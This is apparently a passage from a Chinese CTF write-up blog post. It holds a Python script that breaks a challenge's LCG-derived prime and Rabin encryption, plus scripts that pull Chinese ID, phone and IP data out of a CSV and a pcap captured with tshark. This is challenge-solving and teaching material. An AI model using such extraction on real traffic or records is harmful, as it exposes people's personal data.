<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">2565258348684709722726260231955260453241716968378483821594041597297293609376806025180965681289016169408781752953380586044352169083397987333072306444539318806255242559916564022662479</span></span><br><span class="line">a = <span class="number">7703427441632069990122897903141278700284019287330080801753208940444135129072547305259960648105321270085533531118395452229965873504176368162947864923497711</span></span><br><span class="line">b = <span class="number">8477265953761650860710068507342719089504862957398782381045770264963932696457722724393775545810962476516315838411812248360284564925846788951219272632661157</span></span><br><span class="line">s = <span class="number">9228773209718156231041982890745928246648483643042884535935071957475932603607283209094294685862893340598940862096657878372229519375655468524041406914666867</span></span><br><span class="line">A = <span class="number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span></span><br><span class="line">B = <span class="number">434251860827782638796736001849473241231781620594954088572922898040098881748337513244415553659525671751903798527967205418513869125476445927127124010452649344318178999731385274553080</span></span><br><span class="line"><span class="keyword">assert</span> A==B</span><br><span class="line"></span><br><span class="line">seed = s</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> seed!=A:</span><br><span class="line">    seed = (a*seed+b)%p</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line"><span class="comment">#12345</span></span><br><span class="line">seed = A</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12345</span>):</span><br><span class="line">    seed = (a*seed+b)%p</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"></span><br><span class="line">p2 = next_prime(seed)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">3241139665583501598296135149075754735041636843305130049654913708275571916563715101898946962033698805416493133339619007016676895968314902474922279948997540924678346952667095320094789476561995339618782687993966133770687551933070478999383821269223854568552819152909266096733330218505088222661907600152055916956562332379930822529724151378274932991887183193175206749</span></span><br><span class="line">c = <span class="number">1131281812215293796960536920068009435705926803182047772347743960804329656316689664084120353862091370978145286943689311985878028828902275260824388998300548644880722651153603738691769179255824425771260974588160589473958033612303767050773921373389315920529311000160530833707622310013322631917184737227893101365726934901652170763292132835433158093074003616578836411</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">4</span></span><br><span class="line">q2 = n2//p2</span><br><span class="line"><span class="built_in">print</span>(isPrime(q2),isPrime(p2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">    n = p*q</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, (p+<span class="number">1</span>)//<span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(c, (q+<span class="number">1</span>)//<span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp*p*mq + yq*q*mp) % n</span><br><span class="line">    rr = n-r</span><br><span class="line">    s = (yp*p*mq - yq*q*mp) % n</span><br><span class="line">    ss = n-s</span><br><span class="line">    <span class="keyword">return</span> (r,rr,s,ss)</span><br><span class="line"></span><br><span class="line">m = rabin_decrypt(c, p2, q2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(gmpy2.iroot(m[i],<span class="number">2</span>)[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="数据安全">数据安全</h3>
<h4 id="datasecurity-classify1">datasecurity_classify1</h4>
<p>从 csv 里面读取数据，然后用正则一个个判断数据的类型，然后导出 csv</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_name</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&quot;^[\u4e00-\u9fa5]+$&quot;</span>, name):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_idcard</span>(<span class="params">idcard</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(idcard) != <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    weights = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_codes = <span class="string">&quot;10X98765432&quot;</span></span><br><span class="line">    idcard_body = idcard[:-<span class="number">1</span>]</span><br><span class="line">    idcard_check_digit = idcard[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算校验码</span></span><br><span class="line">    total = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) * weight <span class="keyword">for</span> num, weight <span class="keyword">in</span> <span class="built_in">zip</span>(idcard_body, weights))</span><br><span class="line">    remainder = total % <span class="number">11</span></span><br><span class="line">    expected_check_digit = check_codes[remainder]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> idcard_check_digit.upper() == expected_check_digit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    valid_prefixes = [</span><br><span class="line">        <span class="string">&#x27;734&#x27;</span>, <span class="string">&#x27;735&#x27;</span>, <span class="string">&#x27;736&#x27;</span>, <span class="string">&#x27;737&#x27;</span>, <span class="string">&#x27;738&#x27;</span>, <span class="string">&#x27;739&#x27;</span>, <span class="string">&#x27;747&#x27;</span>, <span class="string">&#x27;748&#x27;</span>, <span class="string">&#x27;750&#x27;</span>, <span class="string">&#x27;751&#x27;</span>, <span class="string">&#x27;752&#x27;</span>, <span class="string">&#x27;757&#x27;</span>, <span class="string">&#x27;758&#x27;</span>, <span class="string">&#x27;759&#x27;</span>, <span class="string">&#x27;772&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;778&#x27;</span>, <span class="string">&#x27;782&#x27;</span>, <span class="string">&#x27;783&#x27;</span>, <span class="string">&#x27;784&#x27;</span>, <span class="string">&#x27;787&#x27;</span>, <span class="string">&#x27;788&#x27;</span>, <span class="string">&#x27;795&#x27;</span>, <span class="string">&#x27;798&#x27;</span>, <span class="string">&#x27;730&#x27;</span>, <span class="string">&#x27;731&#x27;</span>, <span class="string">&#x27;732&#x27;</span>, <span class="string">&#x27;740&#x27;</span>, <span class="string">&#x27;745&#x27;</span>, <span class="string">&#x27;746&#x27;</span>, <span class="string">&#x27;755&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;756&#x27;</span>, <span class="string">&#x27;766&#x27;</span>, <span class="string">&#x27;767&#x27;</span>, <span class="string">&#x27;771&#x27;</span>, <span class="string">&#x27;775&#x27;</span>, <span class="string">&#x27;776&#x27;</span>, <span class="string">&#x27;785&#x27;</span>, <span class="string">&#x27;786&#x27;</span>, <span class="string">&#x27;796&#x27;</span>, <span class="string">&#x27;733&#x27;</span>, <span class="string">&#x27;749&#x27;</span>, <span class="string">&#x27;753&#x27;</span>, <span class="string">&#x27;773&#x27;</span>, <span class="string">&#x27;774&#x27;</span>, <span class="string">&#x27;777&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;780&#x27;</span>, <span class="string">&#x27;781&#x27;</span>, <span class="string">&#x27;789&#x27;</span>, <span class="string">&#x27;790&#x27;</span>, <span class="string">&#x27;791&#x27;</span>, <span class="string">&#x27;793&#x27;</span>, <span class="string">&#x27;799&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(phone) == <span class="number">11</span> <span class="keyword">and</span> phone[:<span class="number">3</span>] <span class="keyword">in</span> valid_prefixes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> validate_name(line):</span><br><span class="line">        result += <span class="string">f&quot;姓名,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> validate_idcard(line):</span><br><span class="line">        result += <span class="string">f&quot;身份证号,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span> validate_phone(line):</span><br><span class="line">        result += <span class="string">f&quot;手机号,<span class="subst">&#123;line&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).write(result)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/kTKu4OweFWaq2np.png"
                        alt="image-20241109135428965"
                 ></p>
<h4 id="datasecurity-classify2">datasecurity_classify2</h4>
<p>用 tshark 导出所有 http 请求的 post数据，然后 unhex 后用正则匹配出里面的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\tshark.exe -r <span class="string">&quot;D:\CTF\race_temp\历史\Yangchengbei2024-初赛\datesafe2\data.pcapng&quot;</span> -Y <span class="string">&quot;http&quot;</span> -T fields -e http.file_data &gt; D:\CTF\race_temp\历史\Yangchengbei2024-初赛\datesafe2\out.txt</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/7PwjdkWsmez69oJ.png"
                        alt="image-20241109135146219"
                 ></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_idcard</span>(<span class="params">idcard</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(idcard) != <span class="number">18</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    weights = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">    check_codes = <span class="string">&quot;10X98765432&quot;</span></span><br><span class="line">    idcard_body = idcard[:-<span class="number">1</span>]</span><br><span class="line">    idcard_check_digit = idcard[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算校验码</span></span><br><span class="line">    total = <span class="built_in">sum</span>(<span class="built_in">int</span>(num) * weight <span class="keyword">for</span> num, weight <span class="keyword">in</span> <span class="built_in">zip</span>(idcard_body, weights))</span><br><span class="line">    remainder = total % <span class="number">11</span></span><br><span class="line">    expected_check_digit = check_codes[remainder]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> idcard_check_digit.upper() == expected_check_digit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_phone</span>(<span class="params">phone</span>):</span><br><span class="line">    valid_prefixes = [</span><br><span class="line">        <span class="string">&quot;734&quot;</span>, <span class="string">&quot;735&quot;</span>, <span class="string">&quot;736&quot;</span>, <span class="string">&quot;737&quot;</span>, <span class="string">&quot;738&quot;</span>, <span class="string">&quot;739&quot;</span>, <span class="string">&quot;747&quot;</span>, <span class="string">&quot;748&quot;</span>, <span class="string">&quot;750&quot;</span>, <span class="string">&quot;751&quot;</span>, <span class="string">&quot;752&quot;</span>, <span class="string">&quot;757&quot;</span>, <span class="string">&quot;758&quot;</span>, <span class="string">&quot;759&quot;</span>, <span class="string">&quot;772&quot;</span>, <span class="string">&quot;778&quot;</span>,</span><br><span class="line">        <span class="string">&quot;782&quot;</span>, <span class="string">&quot;783&quot;</span>, <span class="string">&quot;784&quot;</span>, <span class="string">&quot;787&quot;</span>, <span class="string">&quot;788&quot;</span>, <span class="string">&quot;795&quot;</span>, <span class="string">&quot;798&quot;</span>, <span class="string">&quot;730&quot;</span>, <span class="string">&quot;731&quot;</span>, <span class="string">&quot;732&quot;</span>, <span class="string">&quot;740&quot;</span>, <span class="string">&quot;745&quot;</span>, <span class="string">&quot;746&quot;</span>, <span class="string">&quot;755&quot;</span>, <span class="string">&quot;756&quot;</span>, <span class="string">&quot;766&quot;</span>,</span><br><span class="line">        <span class="string">&quot;767&quot;</span>, <span class="string">&quot;771&quot;</span>, <span class="string">&quot;775&quot;</span>, <span class="string">&quot;776&quot;</span>, <span class="string">&quot;785&quot;</span>, <span class="string">&quot;786&quot;</span>, <span class="string">&quot;796&quot;</span>, <span class="string">&quot;733&quot;</span>, <span class="string">&quot;749&quot;</span>, <span class="string">&quot;753&quot;</span>, <span class="string">&quot;773&quot;</span>, <span class="string">&quot;774&quot;</span>, <span class="string">&quot;777&quot;</span>, <span class="string">&quot;780&quot;</span>, <span class="string">&quot;781&quot;</span>, <span class="string">&quot;789&quot;</span>,</span><br><span class="line">        <span class="string">&quot;790&quot;</span>, <span class="string">&quot;791&quot;</span>, <span class="string">&quot;793&quot;</span>, <span class="string">&quot;799&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(phone) == <span class="number">11</span> <span class="keyword">and</span> phone[:<span class="number">3</span>] <span class="keyword">in</span> valid_prefixes:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ip.split(<span class="string">&quot;.&quot;</span>):</span><br><span class="line">        <span class="comment"># if len(str(int(_))) != len(_):</span></span><br><span class="line">        <span class="comment">#     return False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ( <span class="number">0</span> &lt;= <span class="built_in">int</span>(_) &lt;= <span class="number">255</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">open</span>(<span class="string">&quot;pppdd.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;category,value\n&quot;</span></span><br><span class="line"></span><br><span class="line">ip_r = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+\.\d+\.\d+\.\d+&quot;</span>)</span><br><span class="line">idcard1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;18&#125;&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard12 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;17&#125;[xX]&quot;</span>)</span><br><span class="line">idcard2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line">idcard22 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;6&#125;[ -]\d&#123;8&#125;[ -]\d&#123;3&#125;[xX]&quot;</span>)</span><br><span class="line">phone1 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;11&#125;&quot;</span>)</span><br><span class="line">phone2 = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d&#123;3&#125;[ -]\d&#123;4&#125;[ -]\d&#123;4&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">mpx = &#123;&#125;</span><br><span class="line"></span><br><span class="line">result3 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    dt = binascii.unhexlify(line.strip()).decode()</span><br><span class="line">    <span class="comment"># result3 += dt + &quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    idcards = idcard1.findall(dt) + idcard2.findall(dt) + idcard12.findall(dt) + idcard22.findall(dt)</span><br><span class="line">    phones = phone1.findall(dt) + phone2.findall(dt)</span><br><span class="line">    ips = ip_r.findall(dt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> idcards:</span><br><span class="line">        idcard = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_idcard(idcard):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;idcard,<span class="subst">&#123;idcard&#125;</span>\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> phones:</span><br><span class="line">        <span class="built_in">print</span>(_)</span><br><span class="line">        phone = _.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> validate_phone(phone):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[<span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span>] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;phone,<span class="subst">&#123;phone&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">if</span> check_ip(_):</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">not</span> <span class="keyword">in</span> mpx:</span><br><span class="line">                mpx[_] = <span class="number">1</span></span><br><span class="line">                result += <span class="string">f&quot;ip,<span class="subst">&#123;_&#125;</span>\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(&quot;unhex.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;).write(result3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;result2.csv&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).write(result)</span><br></pre></td></tr></table></figure>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Misc/">Misc</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/post/suidtq/"
                                   title="浅析Linux SUID提权"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">浅析Linux SUID提权</span>
                                        <span class="post-nav-item">上一篇</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/post/2024qwb/"
                                   title="2024 强网杯初赛 Misc方向 部分WriteUp"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">2024 强网杯初赛 Misc方向 部分WriteUp</span>
                                        <span class="post-nav-item">下一篇</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    


    <div class="comments-container border-box">
        <div id="comments-anchor" class="comment-area-title border-box">
            <i class="fas fa-comments"></i>&nbsp;评论
        </div>
        <div class="comment-plugin-fail border-box">
    <span class="fail-tip">评论插件加载失败</span>
    <button class="reload keep-button">点击重新加载</button>
</div>
<div class="comment-plugin-loading flex-center border-box">
    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
    <span class="load-tip">正在加载评论插件</span>
</div>
<script data-pjax>
  window.KeepCommentPlugin = {}
  window.KeepCommentPlugin.hideLoading = () => {
    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
    cplDom.style.display = 'none'
  }
  window.KeepCommentPlugin.loadFailHandle = () => {
    window.KeepCommentPlugin.hideLoading()
    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
    cpfDom.style.display = 'flex'
    cpfDom.querySelector('.reload').addEventListener('click', () => {
      window.location.reload()
    })
  }
</script>

        
            

    <div class="waline-comment-container">
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.css"/>
        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline-meta.css"/>
        <div id="waline-comment"></div>
        <script data-pjax>
          window.KeepCommentPlugin.walineOptions = JSON.parse('{}'.replace(/&#34;/g, '"'))
          window.KeepCommentPlugin.walineOptions.el = '#waline-comment'
          window.KeepCommentPlugin.walineOptions.comment = '.post-comments-count'
          window.KeepCommentPlugin.walineOptions.serverURL = 'https://blog-waline-weld.vercel.app/'
          window.KeepCommentPlugin.walineOptions.lang = 'zh-CN' || 'zh-CN'
          window.KeepCommentPlugin.walineOptions.reaction = 'false' === 'true'
        </script>

        

        
            <script 
                    async
                    type="module"
            >
              import { init } from '//cdn.jsdelivr.net/npm/@waline/client@v3.2.1/dist/waline.js'
              window.KeepCommentPlugin.initWaline = () => {
                if (init) {
                  init(window.KeepCommentPlugin.walineOptions)
                  window.KeepCommentPlugin.hideLoading()
                } else {
                  setTimeout(() => {
                    window.KeepCommentPlugin.initWaline()
                  }, 1000)
                }
              }

              if ('false' === 'true') {
                setTimeout(() => {
                  window.KeepCommentPlugin.initWaline()
                }, 1200)
              } else {
                window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initWaline)
              }
            </script>
        
    </div>


        
    </div>





                
            </div>
        </div>

        
            <div class="pc-post-toc right-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
